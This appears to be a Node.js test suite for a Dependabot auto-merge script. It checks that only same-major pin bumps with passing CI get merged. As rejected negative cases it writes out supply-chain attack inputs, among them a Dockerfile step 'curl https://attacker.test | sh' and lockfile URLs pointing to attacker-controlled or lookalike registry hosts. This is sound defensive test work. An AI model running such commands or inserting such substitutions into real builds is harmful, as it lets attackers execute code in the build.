const { test } = require('node:test');
const assert = require('node:assert/strict');
const { readFileSync } = require('node:fs');
const { join } = require('node:path');
const {
  autoMerge, eligible, npmPinsOnly, validLock, lockPinsOnly, actionsVersionsOnly, dockerVersionsOnly, checksReady,
} = require('../../.github/scripts/dependabot-automerge.cjs');

const repository = 'example/signatures', sha = 'a'.repeat(40), baseSha = 'b'.repeat(40);
function pull() {
  return { number: 9, state: 'open', draft: false, merged: false,
    user: { login: 'dependabot[bot]', type: 'Bot' },
    head: { sha, ref: 'dependabot/npm_and_yarn/patch-and-minor-abc123', repo: { full_name: repository } },
    base: { sha: baseSha, ref: 'main', repo: { full_name: repository } },
    mergeable: true, mergeable_state: 'clean' };
}
function event() {
  return { repository: { full_name: repository, default_branch: 'main' },
    workflow_run: { event: 'pull_request', conclusion: 'success', head_sha: sha,
      head_branch: pull().head.ref, head_repository: { full_name: repository } } };
}
function checks() {
  return ['test (24)', 'test (26)', 'CodeQL'].map(name => ({ name, head_sha: sha,
    status: 'completed', conclusion: name === 'CodeQL' ? 'neutral' : 'success',
    app: { id: name === 'CodeQL' ? 57789 : 15368 } }));
}
const manifest = pin => JSON.stringify({ name: 'test-signatures', version: '2.1.9',
  scripts: { test: 'node --test' }, engines: { node: '>=24' }, dependencies: { library: pin } });
function lock(pin) {
  const pkg = JSON.parse(manifest(pin));
  return JSON.stringify({ name: pkg.name, version: pkg.version, lockfileVersion: 3,
    packages: { '': pkg, 'node_modules/library': { version: pin,
      resolved: `https://registry.npmjs.org/library/-/library-${pin}.tgz`, integrity: 'sha512-eA==' } } });
}

test('only open same-repository Dependabot patch/minor groups can merge', () => {
  assert.ok(eligible(pull(), repository, 'main', sha));
  for (const changes of [
    { user: { login: 'maintainer', type: 'User' } },
    { user: { login: 'dependabot[bot]', type: 'User' } },
    { draft: true }, { state: 'closed' }, { merged: true },
    { head: { ...pull().head, sha: 'changed' } },
    { head: { ...pull().head, repo: { full_name: 'fork/signatures' } } },
    { head: { ...pull().head, ref: 'ordinary/patch-and-minor-abc123' } },
    { head: { ...pull().head, ref: 'dependabot/npm_and_yarn/library-3.0.0' } },
    { head: { ...pull().head, ref: 'dependabot/npm_and_yarn/npm-dependencies-abc123' } },
    { base: { ...pull().base, ref: 'release' } },
    { base: { ...pull().base, repo: { full_name: 'other/repository' } } },
  ]) assert.equal(eligible({ ...pull(), ...changes }, repository, 'main', sha), false);
});

test('group configuration excludes majors for every eligible ecosystem', () => {
  for (const ecosystem of ['npm_and_yarn', 'github_actions', 'docker']) {
    for (const suffix of ecosystem === 'docker' ? [''] : ['', '-security']) {
      assert.ok(eligible({ ...pull(), head: { ...pull().head,
        ref: `dependabot/${ecosystem}/patch-and-minor${suffix}-abc123` } }, repository, 'main', sha));
    }
  }
  const config = readFileSync(join(__dirname, '../../.github/dependabot.yml'), 'utf8');
  const groups = [...config.matchAll(/^      (patch-and-minor(?:-security)?):\n([\s\S]*?)(?=^      \S|^  -|$(?![\s\S]))/gm)];
  assert.equal(groups.length, 5);
  for (const group of groups) assert.match(group[2], /update-types: \["minor", "patch"\]/);
});

test('npm policy permits only stable existing dependency pin increases within a major', () => {
  assert.ok(npmPinsOnly(manifest('1.2.3'), manifest('1.4.0')));
  assert.equal(npmPinsOnly(manifest('1.2.3'), manifest('1.2.3')), false);
  for (const pin of ['2.0.0', '1.1.0', '^1.2.4', '1.2.4-beta.1', 'https://example.test/pkg.tgz', 'file:../pkg']) {
    assert.equal(npmPinsOnly(manifest('1.2.3'), manifest(pin)), false);
  }
  for (const changed of [
    { scripts: { test: 'echo skipped' } }, { version: '2.1.10' },
    { engines: { node: '>=28' } }, { overrides: { library: '2.0.0' } },
    { dependencies: { library: '1.2.4', newPackage: '1.0.0' } }, { dependencies: {} },
  ]) assert.equal(npmPinsOnly(manifest('1.2.3'), JSON.stringify({ ...JSON.parse(manifest('1.2.4')), ...changed })), false);
});

test('lockfiles must match the manifest and use integrity-checked npm registry packages', () => {
  assert.ok(validLock(lock('1.2.3'), lock('1.2.4'), manifest('1.2.4')));
  assert.equal(validLock(lock('1.2.3'), lock('1.2.4'), manifest('1.2.5')), false);
  for (const changed of [
    { resolved: 'https://attacker.test/library.tgz' },
    { resolved: 'https://registry.npmjs.org.attacker.test/library.tgz' },
    { resolved: 'file:../library' }, { integrity: '' }, { link: true },
  ]) {
    const value = JSON.parse(lock('1.2.4'));
    Object.assign(value.packages['node_modules/library'], changed);
    assert.equal(validLock(lock('1.2.3'), JSON.stringify(value), manifest('1.2.4')), false);
  }
});

test('lock-only updates cannot add packages, change root metadata, or cross majors', () => {
  assert.ok(lockPinsOnly(lock('1.2.3'), lock('1.2.4').replaceAll('"library":"1.2.4"', '"library":"1.2.3"')));
  assert.equal(lockPinsOnly(lock('1.2.3'), lock('2.0.0')), false);
  assert.equal(lockPinsOnly(lock('1.2.3'), lock('1.2.3')), false);
  const value = JSON.parse(lock('1.2.3'));
  value.packages['node_modules/added'] = value.packages['node_modules/library'];
  assert.equal(lockPinsOnly(lock('1.2.3'), JSON.stringify(value)), false);
});

test('Actions updates cannot change majors, commands, permissions, or action identity', () => {
  const before = 'steps:\n  - uses: actions/checkout@v7\n  - run: npm test\n';
  assert.ok(actionsVersionsOnly(before, before.replace('@v7', '@v7.1.0')));
  for (const after of [before.replace('@v7', '@v8'), before.replace('npm test', 'echo skipped'),
    before.replace('actions/checkout', 'attacker/checkout'), before + 'permissions: write-all\n']) {
    assert.equal(actionsVersionsOnly(before, after), false);
  }
});

test('Docker updates cannot change image identity, major, channel, stages, or instructions', () => {
  const before = 'FROM node:26-alpine AS runtime\nRUN npm ci\n';
  assert.ok(dockerVersionsOnly(before, before.replace('26-alpine', '26.14.0-alpine')));
  assert.ok(dockerVersionsOnly(before, before.replace('26-alpine', `26-alpine@sha256:${'c'.repeat(64)}`)));
  for (const after of [before.replace('26-alpine', '28-alpine'), before.replace('26-alpine', '26-bookworm'),
    before.replace('node:', 'attacker/node:'), before.replace('AS runtime', 'AS untrusted'),
    before.replace('npm ci', 'curl https://attacker.test | sh')]) {
    assert.equal(dockerVersionsOnly(before, after), false);
  }
});

test('both real CI jobs and CodeQL must finish on the tested SHA', () => {
  assert.ok(checksReady(checks(), [], sha));
  assert.equal(checksReady([], [], sha), false);
  for (let index = 0; index < checks().length; index++) {
    for (const changes of [{ app: { id: 123 } }, { head_sha: 'old' },
      { status: 'in_progress', conclusion: null }, { conclusion: 'failure' },
      { conclusion: 'skipped' }]) {
      const values = checks();
      values[index] = { ...values[index], ...changes };
      assert.equal(checksReady(values, [], sha), false);
    }
  }
  const neutralTest = checks(); neutralTest[0].conclusion = 'neutral';
  assert.equal(checksReady(neutralTest, [], sha), false);
});

test('all additional checks and legacy statuses gate merging', () => {
  for (const conclusion of ['failure', 'cancelled', 'timed_out', 'action_required', null]) {
    assert.equal(checksReady([...checks(), { ...checks()[0], name: 'other', conclusion }], [], sha), false);
  }
  assert.equal(checksReady([...checks(), { ...checks()[0], name: 'other', status: 'queued' }], [], sha), false);
  for (const state of ['pending', 'failure', 'error']) assert.equal(checksReady(checks(), [{ state }], sha), false);
});

function fixture(options = {}) {
  const calls = [];
  let reads = 0;
  const api = async (method, path, fields) => {
    calls.push({ method, path, fields });
    if (method === 'PUT') {
      if (options.error) throw options.error;
      return { merged: options.merge !== false };
    }
    if (method === 'POST') return null;
    if (path.includes('/pulls?')) return [options.pull || pull()];
    if (path.endsWith('/files') || path.includes('/files?')) return options.files ||
      ['package.json', 'package-lock.json'].map(filename => ({ filename, status: 'modified' }));
    if (path.includes('/contents/')) {
      const pathName = path.split('/contents/')[1].split('?')[0];
      const before = new URL(`https://api.test/${path}`).searchParams.get('ref') === baseSha;
      const contents = options.contents || {
        'package.json': [manifest('1.2.3'), manifest('1.2.4')],
        'package-lock.json': [lock('1.2.3'), lock('1.2.4')],
      };
      const text = contents[pathName][before ? 0 : 1];
      return { type: 'file', encoding: 'base64', size: text.length, content: Buffer.from(text).toString('base64') };
    }
    if (path.includes('/check-runs')) return { check_runs: typeof options.checks === 'function' ? options.checks() : options.checks || checks() };
    if (path.includes('/statuses')) return options.statuses || [];
    reads++;
    return reads > 1 && options.current ? options.current : options.pull || pull();
  };
  return { api, calls };
}
const writes = calls => calls.filter(call => call.method !== 'GET');

test('a verified Dependabot pin update merges only its SHA and dispatches post-merge CI', async () => {
  const f = fixture();
  await autoMerge(event(), f.api);
  assert.deepEqual(writes(f.calls), [
    { method: 'PUT', path: `repos/${repository}/pulls/9/merge`, fields: { sha, merge_method: 'squash' } },
    { method: 'POST', path: `repos/${repository}/actions/workflows/ci.yml/dispatches`,
      fields: { ref: 'main' } },
  ]);
});

test('same-major Actions and Docker updates pass the complete gate', async () => {
  for (const [ecosystem, filename, before, after] of [
    ['github_actions', '.github/workflows/ci.yml', '  - uses: actions/checkout@v7\n', '  - uses: actions/checkout@v7.1.0\n'],
    ['docker', 'Dockerfile', 'FROM node:26.12.0-alpine AS runtime\n', 'FROM node:26.13.0-alpine AS runtime\n'],
  ]) {
    const pr = pull(); pr.head.ref = `dependabot/${ecosystem}/patch-and-minor-abc123`;
    const input = event(); input.workflow_run.head_branch = pr.head.ref;
    const f = fixture({ pull: pr, files: [{ filename, status: 'modified' }], contents: { [filename]: [before, after] } });
    await autoMerge(input, f.api); assert.equal(writes(f.calls).length, 2);
  }
});

test('same-major transitive security pins may update without changing package.json', async () => {
  const a = JSON.parse(lock('1.2.3')), b = JSON.parse(lock('1.2.3'));
  for (const [value, pin] of [[a, '1.0.0'], [b, '1.0.1']]) {
    value.packages['node_modules/child'] = { version: pin,
      resolved: `https://registry.npmjs.org/child/-/child-${pin}.tgz`, integrity: 'sha512-eA==' };
  }
  const f = fixture({ files: [{ filename: 'package-lock.json', status: 'modified' }], contents: {
    'package.json': [manifest('1.2.3'), manifest('1.2.3')],
    'package-lock.json': [JSON.stringify(a), JSON.stringify(b)],
  } });
  await autoMerge(event(), f.api); assert.equal(writes(f.calls).length, 2);
});

test('ordinary PRs, forks, old groups, failed runs and non-PR runs never write', async () => {
  for (const changes of [{ user: { login: 'human', type: 'User' } },
    { head: { ...pull().head, repo: { full_name: 'fork/signatures' } } },
    { head: { ...pull().head, ref: 'dependabot/npm_and_yarn/npm-dependencies-abc123' } }]) {
    const f = fixture({ pull: { ...pull(), ...changes } });
    await autoMerge(event(), f.api); assert.equal(writes(f.calls).length, 0);
  }
  for (const changes of [{ event: 'push' }, { event: 'workflow_dispatch' }, { conclusion: 'failure' },
    { head_repository: { full_name: 'fork/signatures' } }]) {
    const input = event(); Object.assign(input.workflow_run, changes);
    const f = fixture(); await autoMerge(input, f.api); assert.equal(f.calls.length, 0);
  }
});

test('unexpected source, bundle, workflow, renamed files or scripts cannot auto-merge', async () => {
  for (const files of [
    [{ filename: 'server/app.js', status: 'modified' }],
    [{ filename: 'outlook-addin/dist/runtime-entry.js', status: 'modified' }],
    [{ filename: '.github/workflows/dependabot-automerge.yml', status: 'modified' }],
    [{ filename: 'package.json', status: 'renamed' }],
  ]) {
    const f = fixture({ files }); await autoMerge(event(), f.api); assert.equal(writes(f.calls).length, 0);
  }
  const f = fixture({ contents: {
    'package.json': [manifest('1.2.3'), manifest('1.2.4').replace('node --test', 'echo skipped')],
    'package-lock.json': [lock('1.2.3'), lock('1.2.4')],
  } });
  await autoMerge(event(), f.api); assert.equal(writes(f.calls).length, 0);
});

test('head or base races and protected/dirty branches prevent merging', async () => {
  for (const current of [
    { ...pull(), head: { ...pull().head, sha: 'changed' } },
    { ...pull(), base: { ...pull().base, sha: 'new-base' } },
    { ...pull(), mergeable_state: 'blocked' },
    { ...pull(), mergeable_state: 'dirty' },
    { ...pull(), mergeable_state: 'behind' },
  ]) {
    const f = fixture({ current }); await autoMerge(event(), f.api); assert.equal(writes(f.calls).length, 0);
  }
});

test('pending checks are re-read, but failures never merge or dispatch', async () => {
  let count = 0, waits = 0;
  const f = fixture({ checks: () => ++count === 1 ? [...checks(), { ...checks()[0], name: 'late', status: 'queued' }] : checks() });
  await autoMerge(event(), f.api, async () => { waits++; });
  assert.equal(waits, 1); assert.equal(writes(f.calls).length, 2);
  const failed = fixture({ checks: [...checks(), { ...checks()[0], name: 'late', conclusion: 'failure' }] });
  await autoMerge(event(), failed.api); assert.equal(writes(failed.calls).length, 0);
});

test('latest status supersedes old failures; rejected merges never publish', async () => {
  const f = fixture({ statuses: [{ context: 'external', state: 'success' }, { context: 'external', state: 'failure' }] });
  await autoMerge(event(), f.api); assert.equal(writes(f.calls).length, 2);
  const rejected = fixture({ merge: false });
  await assert.rejects(autoMerge(event(), rejected.api), /did not merge/);
  assert.equal(rejected.calls.some(call => call.method === 'POST'), false);
  for (const status of [405, 409, 422]) {
    const blocked = fixture({ error: Object.assign(Error('GitHub blocked merge'), { status }) });
    await autoMerge(event(), blocked.api);
    assert.equal(blocked.calls.some(call => call.method === 'POST'), false);
  }
});
